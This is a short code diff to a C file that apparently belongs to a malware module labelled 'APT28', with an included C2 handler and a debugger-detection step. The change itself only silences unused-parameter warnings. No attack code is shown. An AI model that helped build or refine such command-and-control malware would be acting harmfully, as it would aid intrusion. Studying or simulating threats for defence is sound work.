@@ -5,6 +5,8 @@
 #include "c2_handler.c"
 
 int main(int argc, char* argv[]) {
+    (void)argc;  // Unused parameter
+    (void)argv;  // Unused parameter
     printf("[*] APT28 Malware Module Starting...\n");
     printf("[*] Performing debugger detection...\n");
 
